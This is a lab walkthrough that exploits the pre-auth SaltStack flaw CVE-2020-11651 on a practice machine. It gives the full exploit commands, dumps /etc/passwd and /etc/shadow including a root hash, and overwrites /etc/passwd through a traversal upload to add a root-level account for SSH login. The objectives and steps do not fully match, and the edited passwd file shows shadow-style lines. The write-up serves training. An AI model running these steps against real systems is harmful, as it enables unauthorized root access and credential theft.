# Introduction

This lab exploits a pre-auth remote code execution vulnerability in SaltStack Master (CVE-2020-11651). Attackers will leverage the SaltStack API to execute arbitrary commands, resulting in a root shell on the target. 

# Objective

- Enumerate services and identify the SaltStack API running on ports 4505 and 4506.
- Investigate HTTP headers to determine the SaltStack version and verify vulnerability exposure.
- Deploy the CVE-2020-11651 exploit to execute arbitrary commands on the SaltStack Master.
- Establish a reverse shell and confirm root-level access to the target.
- Understand the importance of securing critical management tools against known vulnerabilities.

# Information Gathering 

Nmap Scan Results:
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-24 17:50 -0400
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 17:50
Completed NSE at 17:50, 0.00s elapsed
Initiating NSE at 17:50
Completed NSE at 17:50, 0.00s elapsed
Initiating NSE at 17:50
Completed NSE at 17:50, 0.00s elapsed
Initiating Ping Scan at 17:50
Scanning 192.168.228.62 [4 ports]
Completed Ping Scan at 17:50, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:50
Completed Parallel DNS resolution of 1 host. at 17:50, 0.50s elapsed
Initiating SYN Stealth Scan at 17:50
Scanning 192.168.228.62 [65535 ports]
Discovered open port 53/tcp on 192.168.228.62
Discovered open port 22/tcp on 192.168.228.62
Discovered open port 80/tcp on 192.168.228.62
SYN Stealth Scan Timing: About 12.75% done; ETC: 17:54 (0:03:32 remaining)
Discovered open port 8000/tcp on 192.168.228.62
SYN Stealth Scan Timing: About 40.46% done; ETC: 17:53 (0:01:30 remaining)
SYN Stealth Scan Timing: About 73.68% done; ETC: 17:52 (0:00:33 remaining)
Discovered open port 4505/tcp on 192.168.228.62
Discovered open port 4506/tcp on 192.168.228.62
Completed SYN Stealth Scan at 17:52, 112.30s elapsed (65535 total ports)
Initiating Service scan at 17:52
Scanning 6 services on 192.168.228.62
Completed Service scan at 17:52, 11.20s elapsed (6 services on 1 host)
NSE: Script scanning 192.168.228.62.
Initiating NSE at 17:52
Completed NSE at 17:52, 8.60s elapsed
Initiating NSE at 17:52
Completed NSE at 17:52, 0.44s elapsed
Initiating NSE at 17:52
Completed NSE at 17:52, 0.00s elapsed
Nmap scan report for 192.168.228.62
Host is up (0.050s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-title: Home | Mezzanine
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: nginx/1.16.1
|_http-favicon: Unknown favicon MD5: 11FB4799192313DD5474A343D9CC0A17
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-title: Site doesn't have a title (application/json).
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.16.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

Available ports ==22, 53, 80, 4505, 4506, 8000==

At the target IP we receive a website homepage powered by Mezzanine and Django. After looking into exploits for both, we found an exploit for the Mezzanine powered machines for version 6.0.0. 

Attempts to make the exploit have failed, due to incorrect version number. Let's check the other available ports for potential footholds.

Since we have checked the available web exploits, we can check back to the suspicious open ports running services on the target machine (e.g. ports 4505 & 4506).

According to some research into the services running on the open port, there is a potential exploit that can be performed using salt.
# Service Enumeration

For background, the target IP is running salt and there is a service running on both port 4505 & 4506 called ZeroMQ ZMTP 2.0.

When researching ZeroMQ ZMTP 2.0, I came across a script in both Metasploit and ExploitDB called Saltstack 3000.1 -> https://www.exploit-db.com/exploits/48421 -> that potentially can perform a remote code execution attack on the target machine.

After downloading the exploit, I ran into an issue in my currently working python environment where the module could not be found:

	ModuleNotFoundError: No module named 'salt'

To correct this, I created my own new python environment to download the "salt" library required to run the exploit code. 

--------------------------------------------------------------------------
For reference, I found this link to be extremely helpful in opening a new python environment -> https://packaging.python.org/en/latest/guides/installing-using-pip-and-virtual-environments/

The active link above can be used as a cheatsheet for common commands that allow end users to create a new python env and how to navigate the environment post installion.

--------------------------------------------------------------------------

Now, that we have the library installed, I ran the exploit with the below command:

	python3 48421.py --master 192.168.XXX.XXX --master 192.168.228.62 --read /etc/passwd

With success, we were able to get the contents of the /etc/passwd file:

root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
mezz:x:997:995::/home/mezz:/bin/false
nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin
named:x:25:25:Named:/var/named:/sbin/nologin

Now let's try printing out the /etc/shadow file:

	python3 48421.py --master 192.168.XXX.XXX --master 192.168.228.62 --read /etc/shadow

root:6WT0RuvyM$WIZ6pBFcP7G4pz/jRYY/LBsdyFGIiP3SLl0p32mysET9sBMeNkDXXq52becLp69Q/Uaiu8H0GxQ31XjA8zImo/:18400:0:99999:7:::
bin:*:17834:0:99999:7:::
daemon:*:17834:0:99999:7:::
adm:*:17834:0:99999:7:::
lp:*:17834:0:99999:7:::
sync:*:17834:0:99999:7:::
shutdown:*:17834:0:99999:7:::
halt:*:17834:0:99999:7:::
mail:*:17834:0:99999:7:::
operator:*:17834:0:99999:7:::
games:*:17834:0:99999:7:::
ftp:*:17834:0:99999:7:::
nobody:*:17834:0:99999:7:::
systemd-network:!!:18400::::::
dbus:!!:18400::::::
polkitd:!!:18400::::::
sshd:!!:18400::::::
postfix:!!:18400::::::
chrony:!!:18400::::::
mezz:!!:18400::::::
nginx:!!:18400::::::
named:!!:18400::::::

Success! However, we will not be directly utilizing the /etc/shadow file in this exploit. 

Another function of the exploit code is the ability to upload files directly to the target IP. In this case, we are going to replace the already existing /etc/passwd file with our own "passwd" file with new credentials.

To perform this I created a file called "passwd", created a SHA-512 password called "123", added the existing /etc/passwd content to my own "passwd" file, and then uploaded the file to the target IP:

	1) touch /tmp/passwd
	2) openssl passwd 123
	3) vim /tmp/passwd
	...
	chrony:!!:18400::::::
	mezz:!!:18400::::::
	nginx:!!:18400::::::
	named:!!:18400::::::
==admin:XXX:0:0:root:/root:/bin/bash==

	4) python3 48421.py --master 192.168.228.62 --upload-src /tmp/passwd --upload-dest ../../../../../../etc/passwd

*If the exploits does not store the file from the /tmp directory, please try creating the file in a different location and then performing the exploit command*

With success, the file is directly uploaded! Now all that is left to do is login using the credentials we created using SSH

	ssh admin@192.168.228.62

Success! We have gotten a root shell and can find the root flag in the proof.txt file.

We have successfully solved the machine.
